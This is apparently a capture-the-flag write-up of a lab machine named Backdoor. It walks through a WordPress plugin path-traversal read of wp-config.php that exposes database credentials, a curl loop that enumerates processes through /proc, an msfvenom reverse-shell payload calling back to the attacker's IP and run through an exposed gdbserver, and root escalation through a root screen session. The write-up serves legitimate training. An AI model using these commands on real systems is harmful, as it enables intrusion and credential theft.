# Backdoor

- Target Machine: 10.10.11.125

## Enumeration

### Nmap scan
```log
Nmap scan report for 10.10.11.125
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Directory scan

```log
10.10.11.125/
    /wp-content/
        /plugins
        /themes
        /uploads
        /upgrade
    /wp-admin/
    /wp-includes/
```

-------------

## Foothold

Looking through the found directories, we find that there's a plugin named `ebook-downloader` installed on this webserver, using version `1.1` (found in `/wp-content/plugins/ebook-downloader/readme.txt`).

Searching on ExploitDB, we can easily find a Directory Traversal vulnerability for this plugin version (for [more info](https://www.exploit-db.com/exploits/39575)). We can now use this PoC to explore the victim machine using cURL.

```bash
[exyss@exyss Backdoor]$ curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

[...]

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

[...]
```

Looks like we found the DB credentials. In the `/etc/passwd` file we find an existing user called `user` with a home directory.

## Process enumeration through LFI

Since we have nothing else in particular to look for, we can start enumerating processes. Remember: **_everything_ in Linux is a file**, even **active processes** (they are stored in the `/proc/` directory). Whenever we start a process through the command line, a file named `/proc/$PID/cmdline` is created. This file contains the very same command line arguments used to start that process, including the command name. This means that we can write a quick script that can enumerate processes by using their PID to find out which processes are running on this machine.

```bash
[exyss@exyss Backdoor]$ for i in {1..5000}; do curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/$i/cmdline; echo; done | tee pid_scan
```

The output in pid_scan should look something like this:

```bash
/proc/1/cmdline/proc/1/cmdline/proc/1/cmdline/sbin/init auto automatic-ubiquity noprompt <script>window.close()</script>
/proc/2/cmdline/proc/2/cmdline/proc/2/cmdline<script>window.close()</script>
/proc/3/cmdline/proc/3/cmdline/proc/3/cmdline<script>window.close()</script>
/proc/4/cmdline/proc/4/cmdline/proc/4/cmdline<script>window.close()</script>
/proc/5/cmdline/proc/5/cmdline/proc/5/cmdline<script>window.close()</script>
/proc/6/cmdline/proc/6/cmdline/proc/6/cmdline<script>window.close()</script>
/proc/7/cmdline/proc/7/cmdline/proc/7/cmdline<script>window.close()</script>

[...]

/proc/484/cmdline/proc/484/cmdline/proc/484/cmdline<script>window.close()</script>
/proc/485/cmdline/proc/485/cmdline/proc/485/cmdline<script>window.close()</script>
/proc/486/cmdline/proc/486/cmdline/proc/486/cmdline/lib/systemd/systemd-journald <script>window.close()</script>
/proc/487/cmdline/proc/487/cmdline/proc/487/cmdline<script>window.close()</script>
/proc/488/cmdline/proc/488/cmdline/proc/488/cmdline<script>window.close()</script>
/proc/

[...]
```

In this two snippets that I added, we can see that there are two processes running on this machine: the main root process (PID 1) and the systemd-journald process (PID 484). Of course, there are a lot more processes running, so we can clean up this file removing inactive PIDs by removing every line matching this RegEx pattern `\/proc\/\d+\/cmdline\/proc\/\d+\/cmdline\/proc\/\d+\/cmdline<script>window\.close\(\)</script>\n`.

After doing some more cleanup, the final result is:

```bash
/proc/1/cmdline /proc/1/cmdline /proc/1/cmdline /sbin/init auto automatic-ubiquity noprompt 
/proc/486/cmdline /proc/486/cmdline /proc/486/cmdline /lib/systemd/systemd-journald 
/proc/514/cmdline /proc/514/cmdline /proc/514/cmdline /lib/systemd/systemd-udevd 
/proc/535/cmdline /proc/535/cmdline /proc/535/cmdline /lib/systemd/systemd-networkd 
/proc/657/cmdline /proc/657/cmdline /proc/657/cmdline /sbin/multipathd -d -s 
/proc/658/cmdline /proc/658/cmdline /proc/658/cmdline /sbin/multipathd -d -s 
/proc/659/cmdline /proc/659/cmdline /proc/659/cmdline /sbin/multipathd -d -s 
/proc/660/cmdline /proc/660/cmdline /proc/660/cmdline /sbin/multipathd -d -s 
/proc/661/cmdline /proc/661/cmdline /proc/661/cmdline /sbin/multipathd -d -s 
/proc/662/cmdline /proc/662/cmdline /proc/662/cmdline /sbin/multipathd -d -s 
/proc/663/cmdline /proc/663/cmdline /proc/663/cmdline /sbin/multipathd -d -s 
/proc/678/cmdline /proc/678/cmdline /proc/678/cmdline /lib/systemd/systemd-resolved 
/proc/681/cmdline /proc/681/cmdline /proc/681/cmdline /lib/systemd/systemd-timesyncd 
/proc/705/cmdline /proc/705/cmdline /proc/705/cmdline /usr/bin/VGAuthService 
/proc/714/cmdline /proc/714/cmdline /proc/714/cmdline /usr/bin/vmtoolsd 
/proc/751/cmdline /proc/751/cmdline /proc/751/cmdline /lib/systemd/systemd-timesyncd 
/proc/752/cmdline /proc/752/cmdline /proc/752/cmdline /usr/lib/accountsservice/accounts-daemon 
/proc/753/cmdline /proc/753/cmdline /proc/753/cmdline /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
/proc/756/cmdline /proc/756/cmdline /proc/756/cmdline /usr/lib/accountsservice/accounts-daemon 
/proc/759/cmdline /proc/759/cmdline /proc/759/cmdline /usr/sbin/irqbalance --foreground 
/proc/761/cmdline /proc/761/cmdline /proc/761/cmdline /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
/proc/762/cmdline /proc/762/cmdline /proc/762/cmdline /usr/sbin/irqbalance --foreground 
/proc/763/cmdline /proc/763/cmdline /proc/763/cmdline /usr/bin/vmtoolsd 
/proc/764/cmdline /proc/764/cmdline /proc/764/cmdline /usr/bin/vmtoolsd 
/proc/765/cmdline /proc/765/cmdline /proc/765/cmdline /usr/sbin/rsyslogd -n -iNONE 
/proc/766/cmdline /proc/766/cmdline /proc/766/cmdline /lib/systemd/systemd-logind 
/proc/768/cmdline /proc/768/cmdline /proc/768/cmdline /usr/bin/vmtoolsd 
/proc/772/cmdline /proc/772/cmdline /proc/772/cmdline /usr/sbin/rsyslogd -n -iNONE 
/proc/773/cmdline /proc/773/cmdline /proc/773/cmdline /usr/sbin/rsyslogd -n -iNONE 
/proc/774/cmdline /proc/774/cmdline /proc/774/cmdline /usr/sbin/rsyslogd -n -iNONE 
/proc/829/cmdline /proc/829/cmdline /proc/829/cmdline /usr/sbin/cron -f 
/proc/830/cmdline /proc/830/cmdline /proc/830/cmdline /usr/sbin/CRON -f 
/proc/831/cmdline /proc/831/cmdline /proc/831/cmdline /usr/sbin/CRON -f 
/proc/849/cmdline /proc/849/cmdline /proc/849/cmdline /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done 
/proc/854/cmdline /proc/854/cmdline /proc/854/cmdline su user -c cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true; 
/proc/858/cmdline /proc/858/cmdline /proc/858/cmdline /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done 
/proc/868/cmdline /proc/868/cmdline /proc/868/cmdline /usr/sbin/atd -f 
/proc/870/cmdline /proc/870/cmdline /proc/870/cmdline /usr/sbin/apache2 -k start 
/proc/871/cmdline /proc/871/cmdline /proc/871/cmdline sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
/proc/877/cmdline /proc/877/cmdline /proc/877/cmdline /usr/lib/accountsservice/accounts-daemon 
/proc/923/cmdline /proc/923/cmdline /proc/923/cmdline SCREEN -dmS root 
/proc/925/cmdline /proc/925/cmdline /proc/925/cmdline -/bin/bash 
/proc/933/cmdline /proc/933/cmdline /proc/933/cmdline /usr/lib/policykit-1/polkitd --no-debug 
/proc/935/cmdline /proc/935/cmdline /proc/935/cmdline /usr/lib/policykit-1/polkitd --no-debug 
/proc/937/cmdline /proc/937/cmdline /proc/937/cmdline /usr/lib/policykit-1/polkitd --no-debug 
/proc/946/cmdline /proc/946/cmdline /proc/946/cmdline /lib/systemd/systemd --user 
/proc/950/cmdline /proc/950/cmdline /proc/950/cmdline (sd-pam) 
/proc/958/cmdline /proc/958/cmdline /proc/958/cmdline /sbin/agetty -o -p -- \u --noclear tty1 linux 
/proc/974/cmdline /proc/974/cmdline /proc/974/cmdline /usr/sbin/mysqld 
/proc/982/cmdline /proc/982/cmdline /proc/982/cmdline bash -c cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true; 
/proc/983/cmdline /proc/983/cmdline /proc/983/cmdline gdbserver --once 0.0.0.0:1337 /bin/true 
/proc/993/cmdline /proc/993/cmdline /proc/993/cmdline /usr/sbin/apache2 -k start 
/proc/1016/cmdline /proc/1016/cmdline /proc/1016/cmdline /usr/sbin/mysqld 
/proc/1017/cmdline /proc/1017/cmdline /proc/1017/cmdline /usr/sbin/mysqld 
/proc/1018/cmdline /proc/1018/cmdline /proc/1018/cmdline /usr/sbin/mysqld 
/proc/1019/cmdline /proc/1019/cmdline /proc/1019/cmdline /usr/sbin/mysqld 
/proc/1020/cmdline /proc/1020/cmdline /proc/1020/cmdline /usr/sbin/mysqld 
/proc/1021/cmdline /proc/1021/cmdline /proc/1021/cmdline /usr/sbin/mysqld 
/proc/1022/cmdline /proc/1022/cmdline /proc/1022/cmdline /usr/sbin/mysqld 
/proc/1023/cmdline /proc/1023/cmdline /proc/1023/cmdline /usr/sbin/mysqld 
/proc/1024/cmdline /proc/1024/cmdline /proc/1024/cmdline /usr/sbin/mysqld 
/proc/1025/cmdline /proc/1025/cmdline /proc/1025/cmdline /usr/sbin/mysqld 
/proc/1026/cmdline /proc/1026/cmdline /proc/1026/cmdline /usr/sbin/mysqld 
/proc/1027/cmdline /proc/1027/cmdline /proc/1027/cmdline /usr/sbin/mysqld 
/proc/1028/cmdline /proc/1028/cmdline /proc/1028/cmdline /usr/sbin/mysqld 
/proc/1029/cmdline /proc/1029/cmdline /proc/1029/cmdline /usr/sbin/mysqld 
/proc/1030/cmdline /proc/1030/cmdline /proc/1030/cmdline /usr/sbin/mysqld 
/proc/1031/cmdline /proc/1031/cmdline /proc/1031/cmdline /usr/sbin/mysqld 
/proc/1036/cmdline /proc/1036/cmdline /proc/1036/cmdline /usr/sbin/mysqld 
/proc/1037/cmdline /proc/1037/cmdline /proc/1037/cmdline /usr/sbin/mysqld 
/proc/1038/cmdline /proc/1038/cmdline /proc/1038/cmdline /usr/sbin/mysqld 
/proc/1039/cmdline /proc/1039/cmdline /proc/1039/cmdline /usr/sbin/mysqld 
/proc/1040/cmdline /proc/1040/cmdline /proc/1040/cmdline /usr/sbin/mysqld 
/proc/1041/cmdline /proc/1041/cmdline /proc/1041/cmdline /usr/sbin/mysqld 
/proc/1042/cmdline /proc/1042/cmdline /proc/1042/cmdline /usr/sbin/mysqld 
/proc/1053/cmdline /proc/1053/cmdline /proc/1053/cmdline /usr/sbin/mysqld 
/proc/1054/cmdline /proc/1054/cmdline /proc/1054/cmdline /usr/sbin/mysqld 
/proc/1055/cmdline /proc/1055/cmdline /proc/1055/cmdline /usr/sbin/mysqld 
/proc/1067/cmdline /proc/1067/cmdline /proc/1067/cmdline /usr/sbin/mysqld 
/proc/1068/cmdline /proc/1068/cmdline /proc/1068/cmdline /usr/sbin/mysqld 
/proc/1069/cmdline /proc/1069/cmdline /proc/1069/cmdline /usr/sbin/mysqld 
/proc/1070/cmdline /proc/1070/cmdline /proc/1070/cmdline /usr/sbin/mysqld 
/proc/1071/cmdline /proc/1071/cmdline /proc/1071/cmdline /usr/sbin/mysqld 
/proc/1072/cmdline /proc/1072/cmdline /proc/1072/cmdline /usr/sbin/mysqld 
/proc/1073/cmdline /proc/1073/cmdline /proc/1073/cmdline /usr/sbin/mysqld 
/proc/1074/cmdline /proc/1074/cmdline /proc/1074/cmdline /usr/sbin/mysqld 
/proc/1076/cmdline /proc/1076/cmdline /proc/1076/cmdline /usr/sbin/mysqld 
/proc/1077/cmdline /proc/1077/cmdline /proc/1077/cmdline /usr/sbin/mysqld 
```

## Getting a Reverse Shell

In particular, we notice this five active processes:

```bash
/proc/849/cmdline /proc/849/cmdline /proc/849/cmdline /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done 

/proc/854/cmdline /proc/854/cmdline /proc/854/cmdline su user -c cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;

/proc/858/cmdline /proc/858/cmdline /proc/858/cmdline /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done 

/proc/982/cmdline /proc/982/cmdline /proc/982/cmdline bash -c cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true; 

/proc/983/cmdline /proc/983/cmdline /proc/983/cmdline gdbserver --once 0.0.0.0:1337 /bin/true 
```

We can clearly see that there's a GDBServer running on port 1337. This port is infamous for being associated with backdoors (which is kinda spoiled by this Box's name). We can also see that there's a GNU Screen session being executed as root every 1 second. This will be usefull later for priviledge escalation.

After a quick search, we find a [guide made by HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver) about getting a revshell through GDBServer (remember to setup your ncat)

```bash
[exyss@exyss Backdoor]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.70 LPORT=1234 PrependFork=true -f elf -o revhshell.elf
[exyss@exyss Backdoor]$ chmod +x revshell.elf
[exyss@exyss Backdoor]$ gdb

(gdb) target extended-remote 10.10.11.125:1337
(gdb) remote put revhshell.elf revhshell.elf
(gdb) set remote exec-file /home/user/revhshell.elf
(gdb) run
```

The user flag is in the home directory.

----------

## Priviledge Escalation

As we noticed earlier, there's a GNU Screen session running as root. This part is really easy. We have to just run two commands to attach to that running session and become root.

```bash
user@Backdoor:/home/user$ export TERM=xterm
user@Backdoor:/home/user$ screen -x root/root

root@Backdoor:~$ whoami
whoami
root
```